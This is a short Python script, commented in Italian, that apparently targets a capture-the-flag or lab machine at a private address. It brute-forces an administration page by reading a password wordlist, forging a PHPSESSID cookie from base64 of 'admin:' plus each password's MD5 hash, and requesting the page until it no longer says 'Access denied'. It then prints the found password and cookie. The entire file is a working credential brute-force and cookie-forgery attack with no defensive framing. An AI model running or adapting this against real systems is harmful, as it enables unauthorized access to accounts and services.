import requests
import hashlib
import base64

# Configurazione della URL e della wordlist
url = "http://10.10.246.225/administration.php"
wordlist_path = ".passwords_list.txt"  # Sostituisci con il percorso della tua wordlist

# Funzione per generare il cookie base64
def generate_cookie(password):
    hash_md5 = hashlib.md5(password.encode()).hexdigest()
    encoded = base64.b64encode(f"admin:{hash_md5}".encode()).decode()
    return encoded

# Funzione per verificare l'accesso
def attempt_access(password):
    # Genera il cookie
    cookie_value = generate_cookie(password)
    cookies = {"PHPSESSID": cookie_value}
    
    # Imposta gli header
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "http://10.10.168.50/index.php",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    # Effettua la richiesta GET
    response = requests.get(url, headers=headers, cookies=cookies)

    # Verifica se l'accesso è stato negato
    if "Access denied" not in response.text:
        print(f"[+] Password trovata: {password}")
        print(f"[+] Cookie: {cookie_value}")
        return True
    else:
        print(f"[-] Tentativo fallito con password: {password}")
    return False

# Leggi la wordlist e tenta ogni password
with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as file:
    for password in file:
        password = password.strip()
        if attempt_access(password):
            break
